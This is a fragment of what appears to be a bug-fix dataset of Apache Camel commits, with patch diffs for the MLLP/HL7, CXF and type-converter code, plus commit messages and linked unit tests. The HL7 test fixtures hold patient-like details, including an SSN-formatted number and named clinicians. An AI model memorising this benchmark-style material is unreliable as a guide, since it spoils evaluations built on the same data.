805-418-3500||||||F\" + '\\r'\n+        + \"OBX|5|FT|&GDT|| ||||||F\" + '\\r'\n+        + \"OBX|6|FT|&GDT||TRANSTHORACIC ECHOCARDIOGRAM REPORT||||||F\" + '\\r'\n+        + \"OBX|7|FT|&GDT|| ||||||F\" + '\\r'\n+        + \"OBX|8|FT|&GDT||Patient Name:              Date of Exam:   1/26/2018||||||F\" + '\\r'\n+        + \"OBX|9|FT|&GDT||Medical Rec #:                    Accession #:         ||||||F\" + '\\r'\n+        + \"OBX|10|FT|&GDT||Date of Birth:                   Height:         74 in||||||F\" + '\\r'\n+        + \"OBX|11|FT|&GDT||Age:                             Weight:         230 lbs||||||F\" + '\\r'\n+        + \"OBX|12|FT|&GDT||Gender:                          BSA:            2.31 m\u00b2||||||F\" + '\\r'\n+        + \"OBX|13|FT|&GDT||Referring Physician: 029137 ROMAN LEIBZON Blood Pressure: /||||||F\" + '\\r'\n+        + \"OBX|14|FT|&GDT||Diagnosis: I10- HTN (essential); R94.31-Abnormal EKG||||||F\" + '\\r'\n+        + \"OBX|15|FT|&GDT|| ||||||F\" + '\\r'\n+        + \"OBX|16|FT|&GDT||MEASUREMENTS:||||||F\" + '\\r'\n+        + \"OBX|17|FT|&GDT||LVIDd (2D)     5.16 cm LVIDs (2D)   3.14 cm||||||F\" + '\\r'\n+        + \"OBX|18|FT|&GDT||IVSd (2D)      0.93 cm LVPWd (2D)   1.10 cm||||||F\" + '\\r'\n+        + \"OBX|19|FT|&GDT||LA (2D)        4.00 cm Ao Root (2D) 3.00 cm||||||F\" + '\\r'\n+        + \"OBX|20|FT|&GDT||FINDINGS:||||||F\" + '\\r'\n+        + \"OBX|21|FT|&GDT||Left Ventricle: The left ventricular size is normal. Left ventricular wall thickness is normal. LV wall motion is normal. The ejection fraction by Simpson's \"\n+        +     \"Biplane method is 60 %. Normal LV diastolic function. MV deceleration time is 127 msec.||||||F\" + '\\r'\n+        + \"OBX|22|FT|&GDT||MV E velocity is 0.77 m/s. MV A velocity is 0.56 m/s. E/A ratio is 1.36.||||||F\" + '\\r'\n+        + \"OBX|23|FT|&GDT||Lateral E/e' ratio is 6.0. Medial E/e' ratio is 8.7.||||||F\" + '\\r'\n+        + \"OBX|24|FT|&GDT||Left Atrium: The left atrium is mildly dilated in size. The LA Volume index is 30.8 ml/m\u00b2.||||||F\" + '\\r'\n+        + \"OBX|25|FT|&GDT||Right Atrium: The right atrium is normal in size. RA area is 17 cm2. RA volume is 42 ml.||||||F\" + '\\r'\n+        + \"OBX|26|FT|&GDT||Right Ventricle: The right ventricular size is normal. Global RV systolic function is normal. TAPSE 24 mm. The RV free wall tissue Doppler S' wave measures 16.7 cm/s. \"\n+        +     \"The right ventricle basal diameter measures 26 mm. The right ventricle mid cavity measures 23 mm. The right ventricle longitudinal diameter measures 65 mm.||||||F\" + '\\r'\n+        + \"OBX|27|FT|&GDT||Mitral Valve: Mitral annular calcification noted. Trace mitral valve regurgitation. There is no mitral stenosis.||||||F\" + '\\r'\n+        + \"OBX|28|FT|&GDT||Aortic Valve: The aortic valve appears trileaflet. Trace aortic valve regurgitation. The LVOT velocity is 1.16 m/s. The peak aortic valve velocity is 1.19 m/s. \"\n+        +     \"No aortic valve stenosis.||||||F\" + '\\r'\n+        + \"OBX|29|FT|&GDT||Tricuspid Valve: The tricuspid valve appears normal in structure. Trace tricuspid regurgitation is present. The peak velocity of TR is 2.55 m/s.||||||F\" + '\\r'\n+        + \"OBX|30|FT|&GDT||Pulmonic Valve: Trivial pulmonary valve regurgitation. No evidence of pulmonary valve stenosis.||||||F\" + '\\r'\n+        + \"OBX|31|FT|&GDT||Pericardium: There is no pericardial effusion.||||||F\" + '\\r'\n+        + \"OBX|32|FT|&GDT||Aorta: The aortic root size is normal. The aortic valve annulus measures 25 mm. The sinus of Valsalva measures 33 mm. The sinotubular junction measures 30 mm. \"\n+        +     \"The proximal ascending aorta measures 30 mm.||||||F\" + '\\r'\n+        + \"OBX|33|FT|&GDT||Pulmonary Artery: Based on the acceleration time in the RV outflow tract, the PA pressure is not likely to be elevated. The calculated pulmonary artery pressure \"\n+        +     \"(or right ventricular systolic pressure) is 29 mmHg, if the right atrial pressure is 3 mmHg. Normal PA systolic pressure.||||||F\" + '\\r'\n+        + \"OBX|34|FT|&GDT||IVC: Normal inferior vena cava in diameter with respiratory variation consistent with normal right atrial pressure.||||||F\" + '\\r'\n+        + \"OBX|35|FT|&GDT|| ||||||F\" + '\\r'\n+        + \"OBX|36|FT|&GDT||IMPRESSION:||||||F\" + '\\r'\n+        + \"OBX|37|FT|&GDT|| 1. Normal left ventricular size.||||||F\" + '\\r'\n+        + \"OBX|38|FT|&GDT|| 2. The calculated ejection fraction (Simpson's) is 60 %.||||||F\" + '\\r'\n+        + \"OBX|39|FT|&GDT|| 3. Normal LV diastolic function.||||||F\" + '\\r'\n+        + \"OBX|40|FT|&GDT|| 4. Mildly dilated left atrium in size.||||||F\" + '\\r'\n+        + \"OBX|41|FT|&GDT||029137 Roman Leibzon MD||||||F\" + '\\r'\n+        + \"OBX|42|FT|&GDT||Electronically signed by 029137 Roman Leibzon MD on 1/30/2018 at 3:06:12 PM||||||F\" + '\\r'\n+        + \"OBX|43|FT|&GDT|| ||||||F\" + '\\r'\n+        + \"OBX|44|FT|&GDT||Sonographer: Liana Yenokyan||||||F\" + '\\r'\n+        + \"OBX|45|FT|&GDT|| ||||||F\" + '\\r'\n+        + \"OBX|46|FT|&GDT||*** Final ***||||||F\\r\";\n+        \n+    static final String TARGET_URI = \"mock://target\";\n+\n+    @Rule\n+    public MllpClientResource mllpClient = new MllpClientResource();\n+\n+    @EndpointInject(uri = TARGET_URI)\n+    MockEndpoint target;\n+\n+    @Override\n+    protected CamelContext createCamelContext() throws Exception {\n+        mllpClient.setMllpHost(\"localhost\");\n+        mllpClient.setMllpPort(AvailablePortFinder.getNextAvailable());\n+\n+        DefaultCamelContext context = (DefaultCamelContext) super.createCamelContext();\n+\n+        context.setUseMDCLogging(true);\n+        context.setName(this.getClass().getSimpleName());\n+\n+        return context;\n+    }\n+\n+    @Override\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            String routeId = \"mllp-sender\";\n+\n+            public void configure() {\n+                fromF(\"mllp://%d?receiveTimeout=1000&readTimeout=500&charsetName=ISO-IR-100\", mllpClient.getMllpPort())\n+                    .log(LoggingLevel.INFO, routeId, \"Sending Message\")\n+                    .to(target);\n+            }\n+        };\n+    }\n+\n+\n+    @Test\n+    public void testReceiveMessageWithInvalidMsh18() throws Exception {\n+        target.expectedMinimumMessageCount(1);\n+\n+        mllpClient.connect();\n+\n+        mllpClient.sendMessageAndWaitForAcknowledgement(TEST_MESSAGE);\n+\n+        assertMockEndpointsSatisfied(5, TimeUnit.SECONDS);\n+    }\n+\n+    @Test\n+    public void testReceiveMessageWithValidMsh18() throws Exception {\n+        target.expectedMinimumMessageCount(1);\n+\n+        mllpClient.connect();\n+\n+        mllpClient.sendMessageAndWaitForAcknowledgement(TEST_MESSAGE.replace(\"ISO_IR 100\", \"ISO-IR-100\"));\n+\n+        assertMockEndpointsSatisfied(5, TimeUnit.SECONDS);\n+    }\n+}",
                "raw_url": "https://github.com/apache/camel/raw/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/components/camel-mllp/src/test/java/org/apache/camel/component/mllp/MllpTcpServerCharsetTest.java",
                "sha": "e48d6a5ccf186a18d9f2f748cb152d5da8d65950",
                "status": "added"
            },
            {
                "additions": 27,
                "blob_url": "https://github.com/apache/camel/blob/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/components/camel-mllp/src/test/java/org/apache/camel/component/mllp/internal/Hl7UtilTest.java",
                "changes": 54,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mllp/src/test/java/org/apache/camel/component/mllp/internal/Hl7UtilTest.java?ref=0b7fb515b5f09ab5ce5f5fa269474415070c2f6a",
                "deletions": 27,
                "filename": "components/camel-mllp/src/test/java/org/apache/camel/component/mllp/internal/Hl7UtilTest.java",
                "patch": "@@ -55,21 +55,21 @@\n             + MllpProtocolConstants.END_OF_BLOCK + MllpProtocolConstants.END_OF_DATA;\n \n     static final String EXPECTED_MESSAGE =\n-        \"MSH|^~\\\\&|ADT|EPIC|JCAPS|CC|20161206193919|RISTECH|ADT^A08|00001|D|2.3^^|||||||\" + \"<CR>\"\n-            + \"EVN|A08|20150107161440||REG_UPDATE_SEND_VISIT_MESSAGES_ON_PATIENT_CHANGES|RISTECH^RADIOLOGY^TECHNOLOGIST^^^^^^UCLA^^^^^RRMC||\" + \"<CR>\"\n+        \"MSH|^~\\\\&|ADT|EPIC|JCAPS|CC|20161206193919|RISTECH|ADT^A08|00001|D|2.3^^|||||||\" + \"<0x0D CR>\"\n+            + \"EVN|A08|20150107161440||REG_UPDATE_SEND_VISIT_MESSAGES_ON_PATIENT_CHANGES|RISTECH^RADIOLOGY^TECHNOLOGIST^^^^^^UCLA^^^^^RRMC||\" + \"<0x0D CR>\"\n             + \"PID|1|2100355^^^MRN^MRN|2100355^^^MRN^MRN||MDCLS9^MC9||19700109|F||U|111 HOVER STREET^^LOS ANGELES^CA^90032^USA^P^^LOS ANGELE|LOS ANGELE|(310)725-6952^P^PH^^^310^7256952\"\n-            +     \"||ENGLISH|U||60000013647|565-33-2222|||U||||||||N||\" + \"<CR>\"\n-            + \"PD1|||UCLA HEALTH SYSTEM^^10|10002116^ADAMS^JOHN^D^^^^^EPIC^^^^PROVID||||||||||||||\" + \"<CR>\"\n-            + \"NK1|1|DOE^MC9^^|OTH|^^^^^USA|(310)888-9999^^^^^310^8889999|(310)999-2222^^^^^310^9992222|Emergency Contact 1|||||||||||||||||||||||||||\" + \"<CR>\"\n+            +     \"||ENGLISH|U||60000013647|565-33-2222|||U||||||||N||\" + \"<0x0D CR>\"\n+            + \"PD1|||UCLA HEALTH SYSTEM^^10|10002116^ADAMS^JOHN^D^^^^^EPIC^^^^PROVID||||||||||||||\" + \"<0x0D CR>\"\n+            + \"NK1|1|DOE^MC9^^|OTH|^^^^^USA|(310)888-9999^^^^^310^8889999|(310)999-2222^^^^^310^9992222|Emergency Contact 1|||||||||||||||||||||||||||\" + \"<0x0D CR>\"\n             + \"PV1|1|OUTPATIENT|RR CT^^^1000^^^^^^^DEPID|EL|||017511^TOBIAS^JONATHAN^^^^^^EPIC^^^^PROVID|017511^TOBIAS^JONATHAN^^^^^^EPIC^^^^PROVID||||||CLR|||||60000013647|SELF\"\n-            +     \"|||||||||||||||||||||HOV_CONF|^^^1000^^^^^^^||20150107161438||||||||||\" + \"<CR>\"\n-            + \"PV2||||||||20150107161438||||CT BRAIN W WO CONTRAST||||||||||N|||||||||||||||||||||||||||\" + \"<CR>\"\n-            + \"ZPV||||||||||||20150107161438|||||||||\" + \"<CR>\"\n-            + \"AL1|1||33361^NO KNOWN ALLERGIES^^NOTCOMPUTRITION^NO KNOWN ALLERGIES^EXTELG||||||\" + \"<CR>\"\n-            + \"DG1|1|DX|784.0^Headache^DX|Headache||VISIT\" + \"<CR>\"\n+            +     \"|||||||||||||||||||||HOV_CONF|^^^1000^^^^^^^||20150107161438||||||||||\" + \"<0x0D CR>\"\n+            + \"PV2||||||||20150107161438||||CT BRAIN W WO CONTRAST||||||||||N|||||||||||||||||||||||||||\" + \"<0x0D CR>\"\n+            + \"ZPV||||||||||||20150107161438|||||||||\" + \"<0x0D CR>\"\n+            + \"AL1|1||33361^NO KNOWN ALLERGIES^^NOTCOMPUTRITION^NO KNOWN ALLERGIES^EXTELG||||||\" + \"<0x0D CR>\"\n+            + \"DG1|1|DX|784.0^Headache^DX|Headache||VISIT\" + \"<0x0D CR>\"\n             + \"GT1|1|1000235129|MDCLS9^MC9^^||111 HOVER STREET^^LOS ANGELES^CA^90032^USA^^^LOS ANGELE|(310)725-6952^^^^^310^7256952||19700109|F|P/F|SLF|565-33-2222|||||^^^^^USA|||UNKNOWN\"\n-            +     \"|||||||||||||||||||||||||||||\" + \"<CR>\"\n-            + \"UB2||||||||\" + \"<CR>\";\n+            +     \"|||||||||||||||||||||||||||||\" + \"<0x0D CR>\"\n+            + \"UB2||||||||\" + \"<0x0D CR>\";\n     // @formatter:on\n \n     static final String MSH_SEGMENT = \"MSH|^~\\\\&|0|90100053675|JCAPS|CC|20131125122938|RISMD|ORM|28785|D|2.3\";\n@@ -381,7 +381,7 @@ public void testBytesToPrintFriendlyStringBuilderWithStartAndEndPositions() thro\n         assertEquals(\"\", Hl7Util.bytesToPrintFriendlyStringBuilder(TEST_MESSAGE_BYTES, 1000000, -14).toString());\n         assertEquals(\"\", Hl7Util.bytesToPrintFriendlyStringBuilder(TEST_MESSAGE_BYTES, 1000000, 1000000).toString());\n \n-        assertEquals(\"ADT^A08|00001|D|2.3^^|||||||<CR>EVN|A08|2015010716144\", Hl7Util.bytesToPrintFriendlyStringBuilder(TEST_MESSAGE_BYTES, 50, 100).toString());\n+        assertEquals(\"ADT^A08|00001|D|2.3^^|||||||<0x0D CR>EVN|A08|2015010716144\", Hl7Util.bytesToPrintFriendlyStringBuilder(TEST_MESSAGE_BYTES, 50, 100).toString());\n     }\n \n     /**\n@@ -562,7 +562,7 @@ public void testAppendBytesAsPrintFriendlyStringWithStartAndEndPositions() throw\n \n         builder = new StringBuilder();\n         Hl7Util.appendBytesAsPrintFriendlyString(builder, TEST_MESSAGE_BYTES, 50, 100);\n-        assertEquals(\"ADT^A08|00001|D|2.3^^|||||||<CR>EVN|A08|2015010716144\", builder.toString());\n+        assertEquals(\"ADT^A08|00001|D|2.3^^|||||||<0x0D CR>EVN|A08|2015010716144\", builder.toString());\n     }\n \n     /**\n@@ -583,28 +583,28 @@ public void testAppendCharacterAsPrintFriendlyString() throws Exception {\n \n         builder = new StringBuilder();\n         Hl7Util.appendCharacterAsPrintFriendlyString(builder, MllpProtocolConstants.START_OF_BLOCK);\n-        assertEquals(Hl7Util.START_OF_BLOCK_REPLACEMENT_VALUE, builder.toString());\n+        assertEquals(\"<0x0B VT>\", builder.toString());\n \n         builder = new StringBuilder();\n         Hl7Util.appendCharacterAsPrintFriendlyString(builder, MllpProtocolConstants.END_OF_BLOCK);\n-        assertEquals(Hl7Util.END_OF_BLOCK_REPLACEMENT_VALUE, builder.toString());\n+        assertEquals(\"<0x1C FS>\", builder.toString());\n \n         builder = new StringBuilder();\n         Hl7Util.appendCharacterAsPrintFriendlyString(builder, MllpProtocolConstants.SEGMENT_DELIMITER);\n-        assertEquals(Hl7Util.SEGMENT_DELIMITER_REPLACEMENT_VALUE, builder.toString());\n+        assertEquals(\"<0x0D CR>\", builder.toString());\n \n         builder = new StringBuilder();\n         Hl7Util.appendCharacterAsPrintFriendlyString(builder, MllpProtocolConstants.MESSAGE_TERMINATOR);\n-        assertEquals(Hl7Util.MESSAGE_TERMINATOR_REPLACEMENT_VALUE, builder.toString());\n+        assertEquals(\"<0x0A LF>\", builder.toString());\n     }\n \n     @Test\n     public void testGetCharacterAsPrintFriendlyString() throws Exception {\n-        assertEquals(Hl7Util.START_OF_BLOCK_REPLACEMENT_VALUE, Hl7Util.getCharacterAsPrintFriendlyString(MllpProtocolConstants.START_OF_BLOCK));\n-        assertEquals(Hl7Util.END_OF_BLOCK_REPLACEMENT_VALUE, Hl7Util.getCharacterAsPrintFriendlyString(MllpProtocolConstants.END_OF_BLOCK));\n-        assertEquals(Hl7Util.SEGMENT_DELIMITER_REPLACEMENT_VALUE, Hl7Util.getCharacterAsPrintFriendlyString(MllpProtocolConstants.SEGMENT_DELIMITER));\n-        assertEquals(Hl7Util.MESSAGE_TERMINATOR_REPLACEMENT_VALUE, Hl7Util.getCharacterAsPrintFriendlyString(MllpProtocolConstants.MESSAGE_TERMINATOR));\n-        assertEquals(Hl7Util.TAB_REPLACEMENT_VALUE, Hl7Util.getCharacterAsPrintFriendlyString('\\t'));\n+        assertEquals(\"<0x0B VT>\", Hl7Util.getCharacterAsPrintFriendlyString(MllpProtocolConstants.START_OF_BLOCK));\n+        assertEquals(\"<0x1C FS>\", Hl7Util.getCharacterAsPrintFriendlyString(MllpProtocolConstants.END_OF_BLOCK));\n+        assertEquals(\"<0x0D CR>\", Hl7Util.getCharacterAsPrintFriendlyString(MllpProtocolConstants.SEGMENT_DELIMITER));\n+        assertEquals(\"<0x0A LF>\", Hl7Util.getCharacterAsPrintFriendlyString(MllpProtocolConstants.MESSAGE_TERMINATOR));\n+        assertEquals(\"<0x09 TAB>\", Hl7Util.getCharacterAsPrintFriendlyString('\\t'));\n     }\n \n     /**\n@@ -614,7 +614,7 @@ public void testGetCharacterAsPrintFriendlyString() throws Exception {\n      */\n     @Test\n     public void testFindMsh18WhenExistsWithoutTrailingPipe() throws Exception {\n-        final String testMessage = MSH_SEGMENT + \"|||||||8859/1\" + '\\r' + REMAINING_SEGMENTS;\n+        final String testMessage = MSH_SEGMENT + \"||||||8859/1\" + '\\r' + REMAINING_SEGMENTS;\n \n         assertEquals(\"8859/1\", Hl7Util.findMsh18(testMessage.getBytes()));\n     }\n@@ -626,7 +626,7 @@ public void testFindMsh18WhenExistsWithoutTrailingPipe() throws Exception {\n      */\n     @Test\n     public void testFindMsh18WhenExistsWithTrailingPipe() throws Exception {\n-        final String testMessage = MSH_SEGMENT + \"|||||||8859/1|\" + '\\r' + REMAINING_SEGMENTS;\n+        final String testMessage = MSH_SEGMENT + \"||||||8859/1|\" + '\\r' + REMAINING_SEGMENTS;\n \n         assertEquals(\"8859/1\", Hl7Util.findMsh18(testMessage.getBytes()));\n     }\n@@ -638,7 +638,7 @@ public void testFindMsh18WhenExistsWithTrailingPipe() throws Exception {\n      */\n     @Test\n     public void testFindMsh18WhenMissingWithoutTrailingPipe() throws Exception {\n-        final String testMessage = MSH_SEGMENT + \"|||||||\" + '\\r' + REMAINING_SEGMENTS;\n+        final String testMessage = MSH_SEGMENT + \"||||||\" + '\\r' + REMAINING_SEGMENTS;\n \n         assertEquals(\"\", Hl7Util.findMsh18(testMessage.getBytes()));\n     }\n@@ -650,7 +650,7 @@ public void testFindMsh18WhenMissingWithoutTrailingPipe() throws Exception {\n      */\n     @Test\n     public void testFindMsh18WhenMissingWithTrailingPipe() throws Exception {\n-        final String testMessage = MSH_SEGMENT + \"||||||||\" + '\\r' + REMAINING_SEGMENTS;\n+        final String testMessage = MSH_SEGMENT + \"|||||||\" + '\\r' + REMAINING_SEGMENTS;\n \n         assertEquals(\"\", Hl7Util.findMsh18(testMessage.getBytes()));\n     }",
                "raw_url": "https://github.com/apache/camel/raw/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/components/camel-mllp/src/test/java/org/apache/camel/component/mllp/internal/Hl7UtilTest.java",
                "sha": "9ba18b4590343bfd3a4e3cc6203a4be013c72d23",
                "status": "modified"
            },
            {
                "additions": 14,
                "blob_url": "https://github.com/apache/camel/blob/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/platforms/spring-boot/components-starter/camel-mllp-starter/src/main/java/org/apache/camel/component/mllp/springboot/MllpComponentConfiguration.java",
                "changes": 16,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/platforms/spring-boot/components-starter/camel-mllp-starter/src/main/java/org/apache/camel/component/mllp/springboot/MllpComponentConfiguration.java?ref=0b7fb515b5f09ab5ce5f5fa269474415070c2f6a",
                "deletions": 2,
                "filename": "platforms/spring-boot/components-starter/camel-mllp-starter/src/main/java/org/apache/camel/component/mllp/springboot/MllpComponentConfiguration.java",
                "patch": "@@ -44,6 +44,10 @@\n      * entry.\n      */\n     private Integer logPhiMaxBytes = 5120;\n+    /**\n+     * Set the default character set to use for byte to/from String conversions.\n+     */\n+    private String defaultCharset = \"ISO-8859-1\";\n     /**\n      * Sets the default configuration to use when creating MLLP endpoints.\n      */\n@@ -71,6 +75,14 @@ public void setLogPhiMaxBytes(Integer logPhiMaxBytes) {\n         this.logPhiMaxBytes = logPhiMaxBytes;\n     }\n \n+    public String getDefaultCharset() {\n+        return defaultCharset;\n+    }\n+\n+    public void setDefaultCharset(String defaultCharset) {\n+        this.defaultCharset = defaultCharset;\n+    }\n+\n     public MllpConfigurationNestedConfiguration getConfiguration() {\n         return configuration;\n     }\n@@ -290,8 +302,8 @@ public void setResolvePropertyPlaceholders(\n          * to a String. If the charsetName property is set, that character set\n          * will be used for the conversion. If the charsetName property is not\n          * set, the value of MSH-18 will be used to determine th appropriate\n-         * character set. If MSH-18 is not set, then the default ASCII character\n-         * set will be use.\n+         * character set. If MSH-18 is not set, then the default ISO-8859-1\n+         * character set will be use.\n          * \n          * @param stringPayload\n          *            enabled if true, otherwise disabled",
                "raw_url": "https://github.com/apache/camel/raw/0b7fb515b5f09ab5ce5f5fa269474415070c2f6a/platforms/spring-boot/components-starter/camel-mllp-starter/src/main/java/org/apache/camel/component/mllp/springboot/MllpComponentConfiguration.java",
                "sha": "0ab3bf7eb309c960505c97a98e8cabde58d91e05",
                "status": "modified"
            }
        ],
        "message": "CAMEL-12265 - reduce logging caused by load-balancers, and fix NPE with charset handling",
        "parent": "https://github.com/apache/camel/commit/134df1228ab9c3f2444ce2ab03e3ac277a6edd77",
        "patched_files": [
            "MllpEndpoint.java",
            "MllpProtocolConstants.java",
            "mllp-component.java",
            "MllpComponentConfiguration.java",
            "MllpSocketBuffer.java",
            "MllpException.java",
            "MllpConfiguration.java",
            "MllpComponent.java",
            "Hl7Util.java",
            "MllpTcpServerConsumer.java",
            "TcpSocketConsumerRunnable.java",
            "MllpTcpClientProducer.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "MllpEndpointTest.java",
            "MllpSocketBufferTest.java",
            "MllpExceptionTest.java",
            "MllpTcpServerCharsetTest.java",
            "Hl7UtilTest.java",
            "MllpComponentTest.java"
        ]
    },
    "camel_0c36d7b": {
        "bug_id": "camel_0c36d7b",
        "commit": "https://github.com/apache/camel/commit/0c36d7be59ae6361735e0f9aca4823474c147f8f",
        "file": [
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/0c36d7be59ae6361735e0f9aca4823474c147f8f/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/converter/CxfPayloadConverter.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/converter/CxfPayloadConverter.java?ref=0c36d7be59ae6361735e0f9aca4823474c147f8f",
                "deletions": 1,
                "filename": "components/camel-cxf/src/main/java/org/apache/camel/component/cxf/converter/CxfPayloadConverter.java",
                "patch": "@@ -147,7 +147,8 @@ private CxfPayloadConverter() {\n         if (CxfPayload.class.isAssignableFrom(value.getClass())) {\n             CxfPayload<?> payload = (CxfPayload<?>) value;\n             \n-            if (payload.getBodySources().size() == 1) {\n+            if (payload.getBodySources() != null \n+                && payload.getBodySources().size() == 1) {\n                 if (type.isAssignableFrom(Document.class)) {\n                     Source s = payload.getBodySources().get(0);\n                     Document d;",
                "raw_url": "https://github.com/apache/camel/raw/0c36d7be59ae6361735e0f9aca4823474c147f8f/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/converter/CxfPayloadConverter.java",
                "sha": "0fa3c6043765314fdcb621bbf9eaa5753a277a67",
                "status": "modified"
            }
        ],
        "message": "[CAMEL-5897] FIx a potential NPE\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1423644 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/109c3e9e382758f4b54eff39677b74338ad2e0ad",
        "patched_files": [
            "CxfPayloadConverter.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "CxfPayloadConverterTest.java"
        ]
    },
    "camel_0c8634f": {
        "bug_id": "camel_0c8634f",
        "commit": "https://github.com/apache/camel/commit/0c8634f8e9f4ce03e403c618a2cba2b3aabdc35a",
        "file": [
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/0c8634f8e9f4ce03e403c618a2cba2b3aabdc35a/camel-core/src/main/java/org/apache/camel/converter/IOConverter.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/converter/IOConverter.java?ref=0c8634f8e9f4ce03e403c618a2cba2b3aabdc35a",
                "deletions": 0,
                "filename": "camel-core/src/main/java/org/apache/camel/converter/IOConverter.java",
                "patch": "@@ -99,6 +99,9 @@ public static String toString(Reader reader) throws IOException {\n \n     @Converter\n     public static String toString(BufferedReader reader) throws IOException {\n+        if (reader == null) {\n+            return null;\n+        }\n         try {\n             StringBuilder builder = new StringBuilder();\n             boolean first = true;",
                "raw_url": "https://github.com/apache/camel/raw/0c8634f8e9f4ce03e403c618a2cba2b3aabdc35a/camel-core/src/main/java/org/apache/camel/converter/IOConverter.java",
                "sha": "044662f77ed41c321ea53dc75c59bd6c781401f9",
                "status": "modified"
            },
            {
                "additions": 18,
                "blob_url": "https://github.com/apache/camel/blob/0c8634f8e9f4ce03e403c618a2cba2b3aabdc35a/camel-core/src/main/java/org/apache/camel/converter/ObjectConverter.java",
                "changes": 22,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/converter/ObjectConverter.java?ref=0c8634f8e9f4ce03e403c618a2cba2b3aabdc35a",
                "deletions": 4,
                "filename": "camel-core/src/main/java/org/apache/camel/converter/ObjectConverter.java",
                "patch": "@@ -60,16 +60,30 @@ else if (value.getClass().isArray()) {\n     }\n \n     /**\n-     * Converts the given value to a boolean, handling strings or Boolean objects; otherwise returning true if non-null\n+     * Converts the given value to a boolean, handling strings or Boolean objects;\n+     * otherwise returning false if the value could not be converted to a boolean\n      */\n     @Converter\n-    public static boolean toBoolean(Object value) {\n+    public static boolean toBool(Object value) {\n+        Boolean answer = toBoolean(value);\n+        if (answer != null) {\n+            return answer.booleanValue();\n+        }\n+        return false;\n+    }\n+\n+    /**\n+     * Converts the given value to a Boolean, handling strings or Boolean objects;\n+     * otherwise returning null if the value cannot be converted to a boolean\n+     */\n+    @Converter\n+    public static Boolean toBoolean(Object value) {\n         if (value instanceof Boolean) {\n             return (Boolean) value;\n         }\n         if (value instanceof String) {\n-            return \"true\".equalsIgnoreCase(value.toString());\n+            return \"true\".equalsIgnoreCase(value.toString()) ? Boolean.TRUE : Boolean.FALSE;\n         }\n-        return false;\n+        return null;\n     }\n }",
                "raw_url": "https://github.com/apache/camel/raw/0c8634f8e9f4ce03e403c618a2cba2b3aabdc35a/camel-core/src/main/java/org/apache/camel/converter/ObjectConverter.java",
                "sha": "d22472650ba5e72cfd9e66cee28735e7033d1ff9",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/0c8634f8e9f4ce03e403c618a2cba2b3aabdc35a/camel-core/src/main/java/org/apache/camel/impl/converter/DefaultTypeConverter.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/converter/DefaultTypeConverter.java?ref=0c8634f8e9f4ce03e403c618a2cba2b3aabdc35a",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/converter/DefaultTypeConverter.java",
                "patch": "@@ -104,7 +104,7 @@ public void setInjector(Injector injector) {\n     }\n \n     protected <T> TypeConverter getOrFindTypeConverter(Class toType, Object value) {\n-        Class fromType = null;\n+        Class fromType = Object.class;\n         if (value != null) {\n             fromType = value.getClass();\n         }",
                "raw_url": "https://github.com/apache/camel/raw/0c8634f8e9f4ce03e403c618a2cba2b3aabdc35a/camel-core/src/main/java/org/apache/camel/impl/converter/DefaultTypeConverter.java",
                "sha": "3d0499c3f0e9a05b749f8ddf6e4096c642c30021",
                "status": "modified"
            },
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/0c8634f8e9f4ce03e403c618a2cba2b3aabdc35a/camel-core/src/test/java/org/apache/camel/converter/ConverterTest.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/converter/ConverterTest.java?ref=0c8634f8e9f4ce03e403c618a2cba2b3aabdc35a",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/converter/ConverterTest.java",
                "patch": "@@ -133,4 +133,8 @@ public void testCollectionToPrimitiveArrayConversion() throws Exception {\n \n     }\n \n+    public void testPrimitiveBooleanConversion() throws Exception {\n+        boolean value = converter.convertTo(boolean.class, null);\n+        assertFalse(value);\n+    }\n }",
                "raw_url": "https://github.com/apache/camel/raw/0c8634f8e9f4ce03e403c618a2cba2b3aabdc35a/camel-core/src/test/java/org/apache/camel/converter/ConverterTest.java",
                "sha": "e8f923e792200fbf170579bd601f8efd99b3bb40",
                "status": "modified"
            },
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/0c8634f8e9f4ce03e403c618a2cba2b3aabdc35a/camel-core/src/test/java/org/apache/camel/issues/Issue3Test.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/issues/Issue3Test.java?ref=0c8634f8e9f4ce03e403c618a2cba2b3aabdc35a",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/issues/Issue3Test.java",
                "patch": "@@ -52,6 +52,9 @@ public void process(Exchange exchange) throws Exception {\n \n                         Boolean isDebug = in.getHeader(\"someproperty\", Boolean.class);\n                         assertNull(isDebug);\n+\n+                        boolean isDebug2 = in.getHeader(\"someproperty\", boolean.class);\n+                        assertFalse(isDebug2);\n                     }\n                 });\n             }",
                "raw_url": "https://github.com/apache/camel/raw/0c8634f8e9f4ce03e403c618a2cba2b3aabdc35a/camel-core/src/test/java/org/apache/camel/issues/Issue3Test.java",
                "sha": "19ce5808684bf5aa84856dc355663289470e3849",
